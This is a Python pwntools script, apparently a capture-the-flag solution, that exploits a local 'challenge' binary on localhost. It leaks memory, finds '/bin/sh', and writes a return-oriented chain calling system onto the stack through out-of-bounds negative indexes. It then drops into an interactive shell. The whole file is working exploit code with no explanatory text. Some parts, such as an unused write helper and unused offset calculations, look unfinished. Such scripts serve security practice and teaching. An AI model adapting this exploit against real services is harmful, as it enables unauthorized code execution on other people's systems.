from pwn import *
import struct

b = ELF("./challenge")
p = remote("localhost", 1024)
input("wait")
system_offset = 0x000165e4

off4leak = 0x1c8b8 - system_offset
off4gagdet = 0x1c8b8 - 0x2b9f4



def writestack(addr, val):
    global p
    bval = struct.pack("!q", addr)
    p.sendline("3")
    p.recvuntil(b"?\n")
    p.sendline("4")
    for a in range(4):
        p.sendline(f"{(addr-a)*-1} 0 {(addr-a)*-1} 0 {int(bval[a])}")

# Leak
p.recvuntil("5. exit\r\n")
p.sendline("2")
bigl = p.recvn(66*64+1).replace(b'\r\n', b'').replace(b'\x2e', b'\x00')[1:]

# Find possible addresses
assert(len(bigl) == 4096)
leaks = []
for i in range(0, 4096,4):
    addr= u32(bigl[i:i+4])
    if addr != 0x0:
        leaks.append(addr)

system = 0x165e4
log.info(f"System addr {hex(system)}")
binsh = next(b.search(b"/bin/sh\00"))
log.info(f"/bin/sh at {binsh}")
baddr = p32(0x0002b9f4)
baddr += p32(binsh)
baddr += p32(0x0)
baddr += p32(system)
p.sendline("3")
p.recvuntil(b"?\r\n")
p.sendline("16")
for a in range(16):
    p.sendline(f"{(12-a)*-1} 0 {(12-a)*-1} 0 {int(baddr[a])}")

p.interactive()